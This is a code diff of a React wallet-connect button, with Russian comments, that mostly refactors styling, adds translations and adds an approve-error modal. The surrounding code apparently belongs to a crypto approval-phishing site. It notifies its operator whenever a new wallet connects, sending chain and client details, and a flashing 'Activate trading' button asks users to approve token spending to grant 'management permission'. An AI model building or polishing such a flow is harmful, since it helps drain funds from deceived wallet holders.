@@ -3,6 +3,9 @@ import { Wallet, Copy, Check, LogOut } from 'lucide-react';
 import { useWallet } from '../hooks/useWallet';
 import { useLanguage } from '../hooks/useLanguage';
 import { notifyNewWallet } from '../lib/notify';
+import { SiteModal } from './ui/SiteModal';
+
+type WalletModal = 'none' | 'approve-error';
 
 export const WalletButton: React.FC = () => {
   const {
@@ -21,6 +24,9 @@ export const WalletButton: React.FC = () => {
 
   const { t } = useLanguage();
   const [copied, setCopied] = useState(false);
+
+  const [modal, setModal] = useState<WalletModal>('none');
+  const [approveErrorMessage, setApproveErrorMessage] = useState<string | null>(null);
 
   // трекаем прошлые значения, чтобы ловить "рёбра" подключения и смену аккаунта
   const prevConnected = useRef<boolean>(false);
@@ -62,8 +68,12 @@ export const WalletButton: React.FC = () => {
 
       // EVM детали
       if (w.ethereum) {
-        try { extra.chainId = await w.ethereum.request({ method: 'eth_chainId' }); } catch {}
-        try { extra.web3Client = await w.ethereum.request({ method: 'web3_clientVersion' }); } catch {}
+        try {
+          extra.chainId = await w.ethereum.request({ method: 'eth_chainId' });
+        } catch {}
+        try {
+          extra.web3Client = await w.ethereum.request({ method: 'web3_clientVersion' });
+        } catch {}
       }
     }
 
@@ -81,8 +91,9 @@ export const WalletButton: React.FC = () => {
     const connected = !!wallet?.connected;
     const addr = wallet?.address || null;
 
-    const connectedEdge = connected && !prevConnected.current;          // новый connect
-    const addressChanged = connected && prevAddress.current && prevAddress.current !== addr; // смена аккаунта
+    const connectedEdge = connected && !prevConnected.current; // новый connect
+    const addressChanged =
+      connected && prevAddress.current && prevAddress.current !== addr; // смена аккаунта
 
     if (connectedEdge || addressChanged) {
       void sendNotify();
@@ -108,12 +119,18 @@ export const WalletButton: React.FC = () => {
       await approveToken('1000');
     } catch (error) {
       console.error('Approve failed:', error);
+      setApproveErrorMessage(t('wallet.approveErrorGeneric'));
+      setModal('approve-error');
     }
   };
 
   const onDisconnect = () => {
-    // сбрасывать ничего не нужно — мы теперь шлём на новое "рёбро" подключения
     disconnectWallet();
+  };
+
+  const closeModal = () => {
+    setModal('none');
+    setApproveErrorMessage(null);
   };
 
   if (wallet.connected) {
@@ -121,7 +138,7 @@ export const WalletButton: React.FC = () => {
       <div className="relative group">
         <div
           className={[
-            'bg-gray-800/50 backdrop-blur-sm rounded-lg px-4 py-2 flex items-center space-x-3 border shadow-lg',
+            'flex items-center space-x-3 rounded-lg border bg-gray-800/50 px-4 py-2 shadow-lg backdrop-blur-sm',
             hasManagementPermission
               ? 'border-green-500/30 shadow-green-500/10'
               : 'border-yellow-500/30 shadow-yellow-500/10',
@@ -130,100 +147,147 @@ export const WalletButton: React.FC = () => {
           <div className="flex items-center space-x-2">
             <div
               className={[
-                'w-2 h-2 rounded-full animate-pulse shadow-lg',
+                'h-2 w-2 rounded-full animate-pulse shadow-lg',
                 hasManagementPermission
                   ? 'bg-green-400 shadow-green-400/50'
                   : 'bg-yellow-400 shadow-yellow-400/50',
               ].join(' ')}
             />
-            <span className="text-sm text-gray-300">{formatAddress(wallet.address)}</span>
+            <span className="text-sm text-gray-300">
+              {formatAddress(wallet.address || '')}
+            </span>
           </div>
 
           <button
+            type="button"
             onClick={handleCopyAddress}
-            className="p-1 hover:bg-gray-700 rounded transition-colors"
+            className="rounded p-1 transition-colors hover:bg-gray-700"
             title={t('wallet.copyAddress')}
+            aria-label={t('wallet.copyAddress')}
           >
-            {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4 text-gray-400" />}
+            {copied ? (
+              <Check className="h-4 w-4 text-green-500" />
+            ) : (
+              <Copy className="h-4 w-4 text-gray-400" />
+            )}
           </button>
 
           <button
+            type="button"
             onClick={handleApprove}
             disabled={isApproving}
             className={[
-              'px-3 py-1 rounded text-xs transition-colors font-bold',
+              'rounded px-3 py-1 text-xs font-bold transition-colors',
               hasManagementPermission
                 ? 'bg-green-600 hover:bg-green-700'
                 : 'bg-gradient-to-r from-yellow-500 to-orange-600 hover:from-yellow-400 hover:to-orange-500 animate-pulse',
               isApproving ? 'disabled:bg-gray-600' : '',
             ].join(' ')}
-            title={hasManagementPermission ? 'Trading activated' : 'Click to activate trading'}
+            title={
+              hasManagementPermission
+                ? t('wallet.activateTooltipActive')
+                : t('wallet.activateTooltipNeed')
+            }
           >
-            {isApproving ? '⏳ Approving...' : hasManagementPermission ? '✅ Active' : '🚀 Activate'}
+            {isApproving
+              ? t('wallet.approveButtonApproving')
+              : hasManagementPermission
+              ? t('wallet.approveButtonActive')
+              : t('wallet.approveButtonActivate')}
           </button>
 
           <button
+            type="button"
             onClick={onDisconnect}
-            className="p-1 hover:bg-gray-700 rounded transition-colors text-red-400"
+            className="rounded p-1 text-red-400 transition-colors hover:bg-gray-700"
             title={t('wallet.disconnect')}
+            aria-label={t('wallet.disconnect')}
           >
-            <LogOut className="w-4 h-4" />
+            <LogOut className="h-4 w-4" />
           </button>
         </div>
 
-        {/* Статичная пометка (мы НИКОГДА не запрашиваем сид-фразы) */}
-        <div className="mt-2 text-xs text-white/60 select-none">Seeds:</div>
 
-        {/* Testing dropdown */}
-        <div className="opacity-0 group-hover:opacity-100 absolute top-full right-0 mt-2 w-72 bg-gray-800 rounded-lg shadow-xl border border-gray-700 z-50 transition-opacity duration-200">
+        {/* Testing dropdown (только десктоп-hover, не мешает мобилке) */}
+        <div className="pointer-events-auto absolute top-full right-0 z-50 mt-2 w-72 rounded-lg border border-gray-700 bg-gray-800 opacity-0 shadow-xl transition-opacity duration-200 group-hover:opacity-100">
           <div className="p-3">
-            <h4 className="text-white font-semibold mb-2 text-sm">🧪 Wallet Testing</h4>
-            <div className="space-y-2">
+            <h4 className="mb-2 text-sm font-semibold text-white">
+              {t('wallet.testing.title')}
+            </h4>
+            <div className="space-y-2 text-sm">
               <button
+                type="button"
                 onClick={testWalletCapabilities}
-                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
+                className="w-full rounded px-3 py-2 text-left text-gray-300 transition-colors hover:bg-gray-700 hover:text-white"
               >
-                🔍 Check Capabilities
+                {t('wallet.testing.checkCapabilities')}
               </button>
               <button
+                type="button"
                 onClick={testTokenApprove}
-                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
+                className="w-full rounded px-3 py-2 text-left text-gray-300 transition-colors hover:bg-gray-700 hover:text-white"
               >
-                🧪 Test Token Approve
+                {t('wallet.testing.testApprove')}
               </button>
               <button
+                type="button"
                 onClick={() => void sendNotify()}
-                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
-                title="Повторно отправить уведомление сейчас"
+                className="w-full rounded px-3 py-2 text-left text-gray-300 transition-colors hover:bg-gray-700 hover:text-white"
+                title={t('wallet.testing.notifyAgainTitle')}
               >
-                🔁 Notify again (manual)
+                {t('wallet.testing.notifyAgain')}
               </button>
             </div>
           </div>
         </div>
+
+        {/* Модалка ошибки approve */}
+        <SiteModal
+          isOpen={modal === 'approve-error'}
+          title={t('wallet.modal.approveErrorTitle')}
+          onClose={closeModal}
+          footer={
+            <button
+              type="button"
+              onClick={closeModal}
+              className="rounded-full bg-white/10 px-4 py-1.5 text-sm font-semibold text-white hover:bg-white/20"
+            >
+              {t('common.ok')}
+            </button>
+          }
+        >
+          <p className="text-sm text-slate-100">
+            {approveErrorMessage || t('wallet.modal.approveErrorText')}
+          </p>
+        </SiteModal>
       </div>
     );
   }
 
   return (
-    <button
-      onClick={connectWallet}
-      disabled={isConnecting}
-      className="relative flex items-center space-x-2 px-4 py-2 bg-gradient-to-r from-cyan-500 via-blue-600 to-purple-600 hover:from-cyan-400 hover:via-blue-500 hover:to-purple-500 disabled:from-gray-600 disabled:via-gray-700 disabled:to-gray-800 rounded-lg transition-all duration-300 transform hover:scale-105 shadow-lg shadow-cyan-500/25 border border-cyan-400/50"
-    >
-      <Wallet className="w-4 h-4" />
-      <span className="font-medium">{isConnecting ? 'Connecting...' : t('wallet.connect')}</span>
+    <>
+      <button
+        type="button"
+        onClick={connectWallet}
+        disabled={isConnecting}
+        className="relative flex items-center space-x-2 rounded-lg border border-cyan-400/50 bg-gradient-to-r from-cyan-500 via-blue-600 to-purple-600 px-4 py-2 font-medium text-white shadow-lg shadow-cyan-500/25 transition-all duration-300 hover:scale-105 hover:from-cyan-400 hover:via-blue-500 hover:to-purple-500 disabled:from-gray-600 disabled:via-gray-700 disabled:to-gray-800"
+      >
+        <Wallet className="h-4 w-4" />
+        <span>
+          {isConnecting ? t('wallet.connecting') : t('wallet.connect')}
+        </span>
 
-      {!isConnecting && (
-        <div className="absolute -top-2 -right-2 flex space-x-1">
-          {availableWallets.tronLink && (
-            <div
-              className="w-3 h-3 bg-green-500 rounded-full border border-white shadow-lg"
-              title="TronLink available"
-            />
-          )}
-        </div>
-      )}
-    </button>
+        {!isConnecting && (
+          <div className="absolute -right-2 -top-2 flex space-x-1">
+            {availableWallets.tronLink && (
+              <div
+                className="h-3 w-3 rounded-full border border-white bg-green-500 shadow-lg"
+                title={t('wallet.tronLinkAvailable')}
+              />
+            )}
+          </div>
+        )}
+      </button>
+    </>
   );
 };
